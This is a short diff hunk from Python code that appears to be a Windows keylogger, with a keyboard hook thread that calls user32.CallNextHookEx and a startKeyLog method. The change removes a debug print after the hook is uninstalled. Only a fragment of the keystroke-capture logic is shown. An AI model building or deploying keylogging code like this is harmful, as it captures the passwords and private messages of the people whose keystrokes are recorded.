@@ -150,7 +150,6 @@ class Key(threading.Thread):
         global active
         if not loggingState or not active:
             self.keyLogger.uninstallHookProc()
-            print 'uninstalled'
         return self.user32.CallNextHookEx(self.keyLogger.hooked, nCode, wParam, lParam)
 
     def startKeyLog(self): #(8)
